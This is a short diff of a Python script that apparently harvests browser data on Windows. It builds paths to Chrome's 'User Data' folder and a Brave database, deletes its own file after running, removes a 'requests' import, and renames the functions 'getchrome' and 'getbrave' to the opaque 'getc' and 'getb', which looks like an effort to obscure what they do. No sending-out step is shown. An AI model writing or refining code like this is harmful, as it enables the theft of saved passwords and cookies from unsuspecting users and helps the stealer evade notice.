@@ -4,7 +4,6 @@ import sqlite3
 import shutil
 import base64
 import json
-import requests
 import os
 import sys
 
@@ -123,7 +122,7 @@ def delete_file():
         pass
 
 
-def getchrome():
+def getc():
     root_path = os.path.join(
         os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"
     )
@@ -159,7 +158,7 @@ def getchrome():
     os.remove(os.path.abspath(sys.argv[0]))
 
 
-def getbrave():
+def getb():
     db_path = os.path.join(
         os.environ["USERPROFILE"],
         "AppData",
